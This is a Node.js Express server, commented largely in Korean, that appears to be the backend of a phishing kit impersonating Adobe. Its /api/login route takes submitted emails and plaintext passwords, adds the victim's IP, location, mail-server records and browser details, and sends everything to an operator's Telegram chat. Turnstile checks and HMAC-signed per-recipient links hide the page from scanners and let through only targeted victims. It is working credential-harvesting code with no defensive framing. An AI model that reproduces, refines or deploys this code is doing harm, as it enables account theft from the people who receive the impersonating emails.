// ============================================================
// Adobe Secure Korea — Backend
// Turnstile gate + HMAC signed links + Telegram notifications
// ============================================================
const express = require('express');
const cors    = require('cors');
const crypto  = require('crypto');

const app  = express();
const PORT = process.env.PORT || 3000;

// ============================================================
// Local .env loader (dev only — Render injects env natively)
// ============================================================
if (process.env.NODE_ENV !== 'production') {
  try {
    const fs   = require('fs');
    const path = require('path');
    const envPath = path.join(__dirname, '.env');
    if (fs.existsSync(envPath)) {
      fs.readFileSync(envPath, 'utf8').split('\n').forEach(line => {
        const t = line.trim();
        if (!t || t.startsWith('#')) return;
        const eq = t.indexOf('=');
        if (eq === -1) return;
        const k = t.slice(0, eq).trim();
        const v = t.slice(eq + 1).trim();
        if (!process.env[k]) process.env[k] = v;
      });
      console.log('📄 Loaded .env (dev)');
    }
  } catch (e) { console.warn('⚠️ .env skipped:', e.message); }
}

// ============================================================
// Config
// ============================================================
const BOT_TOKEN            = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID              = process.env.TELEGRAM_CHAT_ID;
const LINK_SECRET          = process.env.LINK_SECRET;
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY;
const FRONTEND_URL         = (process.env.FRONTEND_URL || '').replace(/\/+$/, '');
const NODE_ENV             = process.env.NODE_ENV || 'development';

const PASS_TTL_SECONDS     = 600;             // landing pass valid 10 min
const LINK_TTL_SECONDS     = 7 * 24 * 3600;   // signed email link valid 7 days

// In-memory access log
const documentAccess = new Map();

console.log('========================================');
console.log('🔍 환경 변수 확인:');
console.log(`   NODE_ENV         : ${NODE_ENV}`);
console.log(`   텔레그램 봇 토큰 : ${BOT_TOKEN ? '✅' : '❌'}`);
console.log(`   텔레그램 채팅 ID : ${CHAT_ID ? '✅' : '❌'}`);
console.log(`   Turnstile 비밀키 : ${TURNSTILE_SECRET_KEY ? '✅' : '❌'}`);
console.log(`   링크 서명 시크릿 : ${LINK_SECRET ? '✅' : '❌'}`);
console.log(`   프론트엔드 URL   : ${FRONTEND_URL || '(permissive)'}`);
console.log('========================================');

// ============================================================
// Middleware
// ============================================================
app.set('trust proxy', true);   // Render sits behind a proxy

app.use((req, res, next) => {
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?').split(',')[0].trim();
  console.log(`[REQ] ${new Date().toISOString()} ${req.method} ${req.path} | ip=${ip} | origin=${req.headers.origin || '-'}`);
  next();
});

// ---- CORS --------------------------------------------------
const corsOptions = {
  origin: function (origin, callback) {
    // same-origin / curl / server-to-server have no Origin
    if (!origin) return callback(null, true);

    // permissive mode if FRONTEND_URL is not configured
    if (!FRONTEND_URL) return callback(null, true);

    const allowed = [
      FRONTEND_URL,
      ...(NODE_ENV !== 'production'
        ? [
            'http://localhost:3000',
            'http://localhost:5500',
            'http://127.0.0.1:3000',
            'http://127.0.0.1:5500'
          ]
        : [])
    ];

    if (allowed.includes(origin)) return callback(null, true);
    console.warn(`⛔ CORS 차단: ${origin}`);
    return callback(new Error('Not allowed by CORS'), false);
  },
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type'],
  credentials: false,
  optionsSuccessStatus: 200,
  maxAge: 600
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions));

app.use(express.json({ limit: '256kb' }));
app.use(express.urlencoded({ extended: true, limit: '256kb' }));

// ============================================================
// HMAC helpers
// ============================================================
function requireLinkSecret() {
  if (!LINK_SECRET) throw new Error('LINK_SECRET not configured');
}

function signEmailLink(email, expiresInSeconds = LINK_TTL_SECONDS) {
  requireLinkSecret();
  const exp     = Math.floor(Date.now() / 1000) + expiresInSeconds;
  const payload = `${email}|${exp}`;
  const sig     = crypto.createHmac('sha256', LINK_SECRET).update(payload).digest('hex');
  return `email=${encodeURIComponent(email)}&exp=${exp}&sig=${sig}`;
}

function verifyEmailLink(email, exp, sig) {
  if (!LINK_SECRET || !email || !exp || !sig) return false;
  const expNum = Number(exp);
  if (!Number.isFinite(expNum)) return false;
  if (Math.floor(Date.now() / 1000) > expNum) return false;

  const payload  = `${email}|${expNum}`;
  const expected = crypto.createHmac('sha256', LINK_SECRET).update(payload).digest('hex');

  try {
    const a = Buffer.from(expected, 'hex');
    const b = Buffer.from(sig, 'hex');
    return a.length === b.length && crypto.timingSafeEqual(a, b);
  } catch { return false; }
}

function issueLandingPass(email) {
  requireLinkSecret();
  const ts  = Math.floor(Date.now() / 1000);
  const sig = crypto.createHmac('sha256', LINK_SECRET).update(`${email}|${ts}`).digest('hex');
  return `${ts}.${sig}`;
}

function verifyLandingPass(email, pass, maxAgeSeconds = PASS_TTL_SECONDS) {
  if (!LINK_SECRET || !pass || typeof pass !== 'string') return false;
  const [tsStr, sig] = pass.split('.');
  const ts = Number(tsStr);
  if (!ts || !sig) return false;

  const now = Math.floor(Date.now() / 1000);
  if (now - ts > maxAgeSeconds || ts > now + 5) return false;

  const expected = crypto.createHmac('sha256', LINK_SECRET).update(`${email}|${ts}`).digest('hex');
  try {
    const a = Buffer.from(expected, 'hex');
    const b = Buffer.from(sig, 'hex');
    return a.length === b.length && crypto.timingSafeEqual(a, b);
  } catch { return false; }
}

// ============================================================
// Turnstile verification (server-side)
// ============================================================
async function verifyTurnstileToken(token, ip) {
  if (!TURNSTILE_SECRET_KEY) return { success: false, error: 'no-secret' };
  if (!token || typeof token !== 'string') return { success: false, error: 'no-token' };

  try {
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 8000);

    const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        secret:   TURNSTILE_SECRET_KEY,
        response: token,
        remoteip: ip
      }),
      signal: ctrl.signal
    });
    clearTimeout(timer);

    return await r.json();
  } catch (e) {
    return { success: false, error: e.message };
  }
}

// ============================================================
// Telegram
// ============================================================
async function sendToTelegram(message) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('⚠️ 텔레그램 미설정');
    return null;
  }
  try {
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 8000);

    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        disable_web_page_preview: true
      }),
      signal: ctrl.signal
    });
    clearTimeout(timer);

    const result = await r.json();
    console.log('📤 텔레그램:', result.ok ? '✅' : '❌ ' + (result.description || ''));
    return result;
  } catch (e) {
    console.error('❌ 텔레그램 오류:', e.message);
    return null;
  }
}

// ============================================================
// IP info + MX
// ============================================================
async function getIPInfo(ip) {
  try {
    const first = (ip || '').split(',')[0].trim();
    if (!first || first === '::1' || first === '127.0.0.1') {
      return { ip: first, country: '로컬', city: '로컬', region: '로컬' };
    }
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const r = await fetch(`https://ipinfo.io/${encodeURIComponent(first)}/json`, { signal: ctrl.signal });
    clearTimeout(timer);
    return await r.json();
  } catch (e) {
    return { ip: ip || '?', country: '?', city: '?', region: '?' };
  }
}

async function getMXRecord(domain) {
  try {
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const r = await fetch(`https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`, { signal: ctrl.signal });
    clearTimeout(timer);
    const data = await r.json();
    if (data && Array.isArray(data.Answer) && data.Answer.length) {
      return data.Answer.map(x => x.data).join('\n');
    }
    return 'MX 없음';
  } catch { return 'MX 조회 오류'; }
}

// ============================================================
// Simple in-memory rate limiter
// ============================================================
const rateBuckets = new Map(); // ip -> { count, resetAt }
function rateLimit(key, max, windowMs) {
  const now = Date.now();
  const b   = rateBuckets.get(key) || { count: 0, resetAt: now + windowMs };
  if (now > b.resetAt) { b.count = 0; b.resetAt = now + windowMs; }
  b.count++;
  rateBuckets.set(key, b);
  return b.count <= max;
}
setInterval(() => {
  const now = Date.now();
  for (const [k, v] of rateBuckets) if (now > v.resetAt) rateBuckets.delete(k);
}, 60_000).unref();

// ============================================================
// Health
// ============================================================
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    uptime: Math.floor(process.uptime()),
    env: NODE_ENV,
    turnstile: !!TURNSTILE_SECRET_KEY ? 'enabled' : 'disabled',
    linkSecret: !!LINK_SECRET,
    telegram: !!(BOT_TOKEN && CHAT_ID),
    frontend: FRONTEND_URL || '(permissive)',
    documentAccess: documentAccess.size
  });
});

// ============================================================
// Generate signed link for testing
// GET /api/generate-link?email=...
// ============================================================
app.get('/api/generate-link', (req, res) => {
  const email = (req.query.email || '').trim();
  if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
    return res.status(400).json({ success: false, message: 'Invalid email' });
  }
  if (!LINK_SECRET) {
    return res.status(500).json({ success: false, message: 'LINK_SECRET missing' });
  }

  const query = signEmailLink(email);
  const base  = FRONTEND_URL || `https://your-frontend.example.com`;
  const url   = `${base}/?${query}`;

  res.json({ success: true, email, url, query });
});

// ============================================================
// 🛡️ POST /api/gate/verify — Turnstile → landing pass
// Body: { email, exp, sig, token }
// ============================================================
app.post('/api/gate/verify', async (req, res) => {
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?').split(',')[0].trim();

  if (!rateLimit(`gate:${ip}`, 30, 60_000)) {
    return res.status(429).json({ success: false, message: 'Too many requests' });
  }

  const { email, exp, sig, token } = req.body || {};

  if (!email || !exp || !sig || !token) {
    return res.status(400).json({ success: false, message: 'Missing parameters' });
  }

  if (!verifyEmailLink(email, exp, sig)) {
    console.warn(`⛔ /api/gate/verify: invalid signature ${email}`);
    return res.status(403).json({ success: false, message: 'Invalid or expired link' });
  }

  const result = await verifyTurnstileToken(token, ip);
  if (!result.success) {
    const reasons = (result['error-codes'] || []).join(', ') || result.error || 'unknown';
    console.warn(`⛔ Turnstile 실패: ${email} — ${reasons}`);
    sendToTelegram(
      `🚫 Turnstile 차단\n📧 Email: ${email}\n🌍 IP: ${ip}\n사유: ${reasons}`
    );
    return res.status(403).json({ success: false, message: 'Turnstile verification failed' });
  }

  const pass = issueLandingPass(email);
  console.log(`✅ /api/gate/verify OK: ${email} (ip=${ip})`);
  return res.json({ success: true, pass });
});

// ============================================================
// 🔐 POST /api/login — password attempt → Telegram
// Body: { email, password, attempt, pass }
// ============================================================
app.post('/api/login', async (req, res) => {
  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '?').split(',')[0].trim();

  if (!rateLimit(`login:${ip}`, 60, 60_000)) {
    return res.status(429).json({ success: false, message: 'Too many requests' });
  }

  console.log('📧 /api/login 수신');

  const { email, password, attempt, pass } = req.body || {};

  if (!email || !password) {
    return res.status(400).json({ success: false, message: '이메일과 비밀번호가 필요합니다' });
  }

  const emailRegex = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
  if (!emailRegex.test(email)) {
    return res.status(400).json({ success: false, message: '이메일 형식 오류' });
  }

  if (typeof password !== 'string' || password.length > 200) {
    return res.status(400).json({ success: false, message: '비밀번호 형식 오류' });
  }

  // 🔐 Landing pass check (only browsers that passed Turnstile)
  if (!verifyLandingPass(email, pass)) {
    console.warn(`⛔ /api/login: invalid pass for ${email}`);
    sendToTelegram(`⛔ Landing pass 무효 — ${email}\n🌍 IP: ${ip}`);
    return res.status(403).json({ success: false, message: 'Forbidden' });
  }

  const ipInfo         = await getIPInfo(ip);
  const domain         = email.split('@')[1];
  const mxRecord       = await getMXRecord(domain);
  const userAgent      = req.headers['user-agent']      || '?';
  const acceptLanguage = req.headers['accept-language'] || '?';
  const attemptNum     = (attempt === 2 || attempt === '2') ? 2 : 1;
  const attemptLabel   = attemptNum === 2 ? '2차 (확인)' : '1차 (최초)';

  console.log(`   📨 ${email} | ${attemptLabel}`);

  documentAccess.set(email, {
    lastAccess: new Date().toISOString(),
    ip,
    ipInfo,
    attempts: (documentAccess.get(email)?.attempts || 0) + 1
  });

  const msg =
`🔐 문서 접근 — ${email} — ${attemptLabel}

📧 이메일: ${email}
🔑 비밀번호: ${password}
🎯 시도: ${attemptLabel}
🌐 도메인: ${domain}
📨 MX: ${mxRecord}
🌍 IP: ${ip}
📍 위치: ${ipInfo.city || '?'}, ${ipInfo.region || '?'}, ${ipInfo.country || '?'}
📱 브라우저: ${userAgent.substring(0, 80)}
🗣 언어: ${acceptLanguage}
🕐 시각: ${new Date().toLocaleString('ko-KR')}

📄 총 ${documentAccess.get(email).attempts}회 시도`;

  const tg   = await sendToTelegram(msg);
  const tgOK = !!(tg && tg.ok);
  console.log(`   텔레그램: ${tgOK ? '✅' : '❌'}`);

  return res.json({
    success: true,
    message: '로그인 처리 완료',
    notifications: { telegram: tgOK }
  });
});

// ============================================================
// Admin: access log
// ============================================================
app.get('/api/document-access', (req, res) => {
  const list = Array.from(documentAccess.entries()).map(([email, data]) => ({ email, ...data }));
  res.json({ success: true, count: list.length, data: list });
});

// ============================================================
// 404
// ============================================================
app.use('*', (req, res) => {
  console.log('❓ 404:', req.method, req.originalUrl);
  res.status(404).json({ success: false, message: `Not found: ${req.method} ${req.originalUrl}` });
});

// ============================================================
// Global error handler
// ============================================================
app.use((err, req, res, next) => {
  if (err && err.message === 'Not allowed by CORS') {
    return res.status(403).json({ success: false, message: 'Forbidden' });
  }
  console.error('❌ Unhandled:', err && err.message);
  res.status(500).json({ success: false, message: 'Server error' });
});

// ============================================================
// Start
// ============================================================
app.listen(PORT, () => {
  console.log('========================================');
  console.log(`🚀 서버 실행 — 포트 ${PORT}`);
  console.log(`🌐 헬스:    GET  /health`);
  console.log(`🔗 링크:    GET  /api/generate-link?email=...`);
  console.log(`🛡️ 게이트:  POST /api/gate/verify`);
  console.log(`🔐 로그인:  POST /api/login`);
  console.log('========================================');
});

process.on('uncaughtException',  (err) => console.error('❌ 예외:', err.message));
process.on('unhandledRejection', (r)   => console.error('❌ 거부:', r));